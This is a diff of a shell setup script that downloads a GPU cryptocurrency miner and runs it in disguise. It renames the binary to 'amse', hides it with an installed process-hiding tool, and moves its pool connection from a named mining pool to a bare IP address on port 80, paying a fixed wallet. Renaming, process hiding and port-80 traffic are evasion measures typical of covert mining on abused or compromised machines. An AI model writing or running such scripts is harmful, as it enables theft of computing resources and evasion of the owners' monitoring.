@@ -14,11 +14,11 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
 dpkg-reconfigure --frontend noninteractive tzdata
-wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.2.1/tw-pearl-miner-linux-cuda13.tar.gz
-tar xf tw-pearl-miner-linux-cuda13.tar.gz
-cd tw-pearl-miner-linux
+wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.2.2/tw-pearl-miner-3.2.2.tar.gz
+tar xf tw-pearl-miner-3.2.2.tar.gz
+cd tw-pearl-miner
 mv pearl-gpu-miner amse
 
 ph add amse
 
-./amse --pool prl.kryptex.network:7048 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
+./amse --pool 20.205.214.159:80 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
